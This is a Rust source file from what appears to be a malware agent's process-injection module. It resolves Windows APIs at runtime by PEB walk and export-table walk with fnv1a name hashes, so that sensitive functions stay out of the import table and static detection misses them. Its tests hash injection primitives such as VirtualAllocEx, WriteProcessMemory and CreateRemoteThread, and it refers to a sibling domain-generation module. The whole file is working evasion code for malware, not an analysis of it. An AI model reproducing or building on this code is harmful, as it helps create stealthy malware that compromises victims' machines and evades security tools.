// src/agent/injection/windows/resolve.rs
//! Lazy Win32 API resolution. Sensitive APIs are resolved at first call by
//! fnv1a-32 name hash (PEB walk for the module base, export-table walk for
//! the function) so they never appear in the PE import table at rest.
//!
//! The hash fn compiles on every target so its stability vectors run in
//! host-side unit tests; the resolver machinery is Windows-only. This file
//! is declared via #[path] from injection/mod.rs for that reason.

/// fnv1a-32 over raw bytes. The codebase's hash convention is the fnv1a
/// family (agent/dga.rs fnv1a_mix, scripting/helpers.rs fnv1a_hash); this
/// variant is const + u32 so it fits import hashing at compile time.
pub const fn fnv1a_32(bytes: &[u8]) -> u32 {
    let mut h: u32 = 0x811c_9dc5;
    let mut i = 0usize;
    while i < bytes.len() {
        h ^= bytes[i] as u32;
        h = h.wrapping_mul(0x0100_0193);
        i += 1;
    }
    h
}

#[cfg(target_os = "windows")]
mod imp {
    use super::fnv1a_32;
    use std::ffi::c_void;
    use std::sync::OnceLock;

    // ── PEB walk (no imports needed) ─────────────────────────────────────

    #[cfg(target_arch = "x86_64")]
    unsafe fn peb() -> *mut u8 {
        let peb: *mut u8;
        std::arch::asm!("mov {0}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags));
        peb
    }

    #[cfg(target_arch = "x86")]
    unsafe fn peb() -> *mut u8 {
        let peb: *mut u8;
        std::arch::asm!("mov {0}, fs:[0x30]", out(reg) peb, options(nostack, preserves_flags));
        peb
    }

    // LDR offsets (stable since NT): x64: Ldr@+0x18, InMemoryOrder links
    // head @ldr+0x20, entry = link-0x10, DllBase@entry+0x30, BaseDllName
    // (UNICODE_STRING) @entry+0x58. x86: Ldr@+0x0C, head @ldr+0x14,
    // entry = link-0x08, DllBase@entry+0x18, BaseDllName@entry+0x2C.
    #[cfg(target_arch = "x86_64")]
    const LDR_OFF: usize = 0x18;
    #[cfg(target_arch = "x86_64")]
    const LIST_OFF: usize = 0x20;
    #[cfg(target_arch = "x86_64")]
    const LINK_TO_ENTRY: usize = 0x10;
    #[cfg(target_arch = "x86_64")]
    const DLLBASE_OFF: usize = 0x30;
    #[cfg(target_arch = "x86_64")]
    const BASENAME_OFF: usize = 0x58;
    #[cfg(target_arch = "x86")]
    const LDR_OFF: usize = 0x0C;
    #[cfg(target_arch = "x86")]
    const LIST_OFF: usize = 0x14;
    #[cfg(target_arch = "x86")]
    const LINK_TO_ENTRY: usize = 0x08;
    #[cfg(target_arch = "x86")]
    const DLLBASE_OFF: usize = 0x18;
    #[cfg(target_arch = "x86")]
    const BASENAME_OFF: usize = 0x2C;

    /// fnv1a-32 over a UTF-16 module base name, ASCII-lowercased, so the
    /// compare is case-insensitive against lowercase b"kernel32.dll" style
    /// hashes.
    unsafe fn hash_wide_lowercase(buf: *const u16, chars: usize) -> u32 {
        let mut h: u32 = 0x811c_9dc5;
        for i in 0..chars {
            let mut c = *buf.add(i) as u32;
            if c >= 'A' as u32 && c <= 'Z' as u32 {
                c += 32;
            }
            // Module names are ASCII; high bytes would only break a match.
            h ^= c & 0xff;
            h = h.wrapping_mul(0x0100_0193);
        }
        h
    }

    /// Base address of an already-loaded module whose lowercase base name
    /// hashes to `name_hash`, or 0.
    unsafe fn peb_find(name_hash: u32) -> usize {
        let peb = peb();
        if peb.is_null() {
            return 0;
        }
        let ldr = *(peb.add(LDR_OFF) as *const usize);
        if ldr == 0 {
            return 0;
        }
        let head = ldr + LIST_OFF;
        let mut link = *(head as *const usize);
        while link != 0 && link != head {
            let entry = link - LINK_TO_ENTRY;
            let base = *( (entry + DLLBASE_OFF) as *const usize);
            let name_len = *((entry + BASENAME_OFF) as *const u16) as usize / 2;
            let name_buf = *((entry + BASENAME_OFF + std::mem::size_of::<usize>()) as *const usize)
                as *const u16;
            if !name_buf.is_null() && name_len > 0 {
                if hash_wide_lowercase(name_buf, name_len) == name_hash {
                    return base;
                }
            }
            link = *(link as *const usize);
        }
        0
    }

    // ── Export table walk ────────────────────────────────────────────────

    /// fnv1a-32 over a NUL-terminated export name (exact case).
    unsafe fn hash_cstr(mut p: *const u8) -> u32 {
        let mut h: u32 = 0x811c_9dc5;
        while *p != 0 {
            h ^= *p as u32;
            h = h.wrapping_mul(0x0100_0193);
            p = p.add(1);
        }
        h
    }

    /// Resolve an export by name hash from a loaded module base. Returns 0
    /// on any parse failure or a forwarded export (none of the APIs we
    /// resolve are forwarders on supported Windows).
    unsafe fn eat_lookup(base: usize, name_hash: u32) -> usize {
        if base == 0 {
            return 0;
        }
        let b = base as *const u8;
        if *(b as *const u16) != 0x5a4d {
            return 0; // MZ
        }
        let nt_off = *(b.add(0x3c) as *const i32) as usize;
        let nt = b.add(nt_off);
        if *(nt as *const u32) != 0x0000_4550 {
            return 0; // PE\0\0
        }
        // Export directory is data dir 0 in the optional header:
        // PE32+ RVA@nt+24+0x70, PE32 RVA@nt+24+0x60; size follows at +4.
        #[cfg(target_arch = "x86_64")]
        let dir_off = 24 + 0x70;
        #[cfg(target_arch = "x86")]
        let dir_off = 24 + 0x60;
        let export_rva = *(nt.add(dir_off) as *const u32) as usize;
        let export_size = *(nt.add(dir_off + 4) as *const u32) as usize;
        if export_rva == 0 {
            return 0;
        }
        let dir = b.add(export_rva);
        let num_names = *(dir.add(0x18) as *const u32) as usize;
        let funcs_rva = *(dir.add(0x1c) as *const u32) as usize;
        let names_rva = *(dir.add(0x20) as *const u32) as usize;
        let ords_rva = *(dir.add(0x24) as *const u32) as usize;
        let names = b.add(names_rva) as *const u32;
        let ords = b.add(ords_rva) as *const u16;
        let funcs = b.add(funcs_rva) as *const u32;
        for i in 0..num_names {
            let name_rva = *names.add(i) as usize;
            if hash_cstr(b.add(name_rva)) == name_hash {
                let ord = *ords.add(i) as usize;
                let fn_rva = *funcs.add(ord) as usize;
                if fn_rva >= export_rva && fn_rva < export_rva + export_size {
                    return 0; // forwarder string, not a code pointer
                }
                return base + fn_rva;
            }
        }
        0
    }

    /// LoadLibraryA resolved from kernel32's export table, used only when
    /// the PEB walk misses (module not yet loaded).
    unsafe fn load_library(name_nul: &[u8]) -> usize {
        type F = unsafe extern "system" fn(*const i8) -> *mut c_void;
        let k32 = peb_find(fnv1a_32(b"kernel32.dll"));
        let p = eat_lookup(k32, fnv1a_32(b"LoadLibraryA"));
        if p == 0 {
            return 0;
        }
        let f: F = std::mem::transmute(p);
        f(name_nul.as_ptr() as *const i8) as usize
    }

    // ── Public surface (used by the generated wrappers) ──────────────────

    /// Module base by name; `module` is lowercase and NUL-terminated
    /// (b"kernel32.dll\0") so the LoadLibrary fallback can pass it through.
    /// Cached per known module; 0 only if the module truly cannot load.
    pub fn mod_handle(module: &'static [u8]) -> usize {
        macro_rules! cached {
            ($cell:ident) => {{
                static $cell: OnceLock<usize> = OnceLock::new();
                *$cell.get_or_init(|| unsafe {
                    let plain = &module[..module.len() - 1]; // strip NUL
                    let h = fnv1a_32(plain);
                    let base = peb_find(h);
                    if base != 0 {
                        base
                    } else {
                        load_library(module)
                    }
                })
            }};
        }
        match module {
            b"kernel32.dll\0" => cached!(K32),
            b"ntdll.dll\0" => cached!(NTDLL),
            b"advapi32.dll\0" => cached!(ADVAPI),
            b"user32.dll\0" => cached!(USER32),
            b"gdi32.dll\0" => cached!(GDI32),
            b"crypt32.dll\0" => cached!(CRYPT32),
            b"psapi.dll\0" => cached!(PSAPI),
            b"wevtapi.dll\0" => cached!(WEVTAPI),
            b"mscoree.dll\0" => cached!(MSCOREE),
            b"shell32.dll\0" => cached!(SHELL32),
            _ => cached!(OTHER),
        }
    }

    /// Resolve an export pointer by name hash from a module base. Caller
    /// caches the result in its own OnceLock; 0 means unresolved.
    pub fn resolve_ptr(module: &'static [u8], name_hash: u32) -> usize {
        let base = mod_handle(module);
        unsafe { eat_lookup(base, name_hash) }
    }
}

#[cfg(target_os = "windows")]
pub use imp::{mod_handle, resolve_ptr};

#[cfg(test)]
mod tests {
    use super::fnv1a_32;

    // Stability vectors: fnv1a-32 reference values (offset 0x811c9dc5,
    // prime 0x01000193), cross-checked against the public definition.
    #[test]
    fn fnv1a_32_vectors() {
        assert_eq!(fnv1a_32(b""), 0x811c_9dc5);
        assert_eq!(fnv1a_32(b"a"), 0xe40c_292c);
        assert_eq!(fnv1a_32(b"VirtualAllocEx"), 0xaeb6_049c);
        assert_eq!(fnv1a_32(b"kernel32.dll"), 0xa3e6_f6c3);
        assert_eq!(fnv1a_32(b"CreateRemoteThread"), 0xc398_c463);
    }

    #[test]
    fn fnv1a_32_is_case_sensitive_for_exports() {
        // EAT names are case-sensitive; module compare lowercases instead.
        assert_ne!(fnv1a_32(b"openprocess"), fnv1a_32(b"OpenProcess"));
    }

    #[test]
    fn fnv1a_32_stable_across_calls() {
        assert_eq!(fnv1a_32(b"WriteProcessMemory"), fnv1a_32(b"WriteProcessMemory"));
    }

    // Resolver cache behavior requires a real Windows module table; runs
    // only in Windows test builds.
    #[cfg(target_os = "windows")]
    #[test]
    fn resolver_cache_returns_same_pointer_twice() {
        use super::{mod_handle, resolve_ptr};
        let a = mod_handle(b"kernel32.dll\0");
        let b = mod_handle(b"kernel32.dll\0");
        assert_ne!(a, 0);
        assert_eq!(a, b, "module base is cached");
        let p1 = resolve_ptr(b"kernel32.dll\0", fnv1a_32(b"GetLastError"));
        let p2 = resolve_ptr(b"kernel32.dll\0", fnv1a_32(b"GetLastError"));
        assert_ne!(p1, 0);
        assert_eq!(p1, p2, "export resolution is stable");
    }
}
